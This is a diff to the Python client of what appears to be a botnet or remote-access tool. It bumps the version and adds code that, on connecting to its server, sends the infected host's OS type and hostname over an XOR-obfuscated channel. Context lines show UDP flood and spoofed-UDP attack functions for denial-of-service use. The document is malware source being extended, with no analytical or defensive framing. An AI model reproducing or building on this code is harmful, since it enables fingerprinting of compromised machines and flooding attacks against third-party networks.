@@ -14,13 +14,19 @@ __author__ = "Kolokotronis Panagiotis"
 __copyright__ = "Copyright 2016, Kolokotronis Panagiotis"
 __credits__ = ["Kolokotronis Panagiotis", "Dimitris Zervas", "Lain Iwakura"]
 __license__ = "MIT"
-__version__ = "0.2.6"
+__version__ = "0.2.7"
 __maintainer__ = "Kolokotronis Panagiotis"
 
 
 def exponential_backoff(c_factor):
     """Calculate backoff time for reconnect."""
     return int(((2**c_factor)-1)/2)
+
+
+def sys_info():
+    import platform
+    sys_info_tup = platform.uname()
+    return (sys_info_tup[0], sys_info_tup[1])
 
 
 def get_len(in_string, max_len):
@@ -52,6 +58,9 @@ def make_en_stdout(stdout):
     """
     en_stdout = bytearray(stdout, 'UTF-8')
     return obf_deobf(en_stdout)
+    #for i in range(len(en_stdout)):
+    #    en_stdout[i] = en_stdout[i] ^ 0x41
+    #return en_stdout
 
 
 def make_en_bin_stdout(stdout):
@@ -62,12 +71,18 @@ def make_en_bin_stdout(stdout):
     """
     en_stdout = bytearray(stdout)
     return obf_deobf(en_stdout)
+    #for i in range(len(en_stdout)):
+    #    en_stdout[i] = en_stdout[i] ^ 0x41
+    #return en_stdout
 
 
 def make_en_data(data):
     """Deobfuscate (xor) data, return string."""
     en_data = bytearray(data)
     return obf_deobf(en_data)
+    #for i in range(len(en_data)):
+    #    en_data[i] = en_data[i] ^ 0x41
+    #return en_data
 
 
 def udp_flood_start(target_ip, target_port, msg):
@@ -110,7 +125,7 @@ def udp_spoof_start(target_ip, target_port, spoofed_ip, spoofed_port, payload):
 
 
 class Client(object):
-    """docstring for Client."""
+    """Class for Client."""
     def __init__(self, addr, port=9000):
         self.sock = socket(AF_INET, SOCK_STREAM)
         self.address = addr
@@ -154,8 +169,30 @@ class Client(object):
         """Connect to the Server."""
         try:
             self.sock.connect((self.address, self.port))
+            ###Send Version###
+            msg_len = get_len(self.version,2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = make_en_stdout(msg_len)
+            en_stdout = self.send(en_stdout)
             en_stdout = make_en_stdout(self.version)
             en_stdout = self.send(en_stdout)
+            ##################
+            sys_type, sys_hname = sys_info()
+            ###Send System Type###
+            msg_len = get_len(sys_type,2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = make_en_stdout(msg_len)
+            en_stdout = self.send(en_stdout)
+            en_stdout = make_en_stdout(sys_type)
+            en_stdout = self.send(en_stdout)
+            ######################
+            ###Send Hostname###
+            if sys_hname == "":
+                sys_hname = "None"
+            msg_len = get_len(sys_hname,2) # len is 2-digit (i.e. up to 99 chars)
+            en_stdout = make_en_stdout(msg_len)
+            en_stdout = self.send(en_stdout)
+            en_stdout = make_en_stdout(sys_hname)
+            en_stdout = self.send(en_stdout)
+            ###################
         except sock_error:
             raise sock_error
         return 0
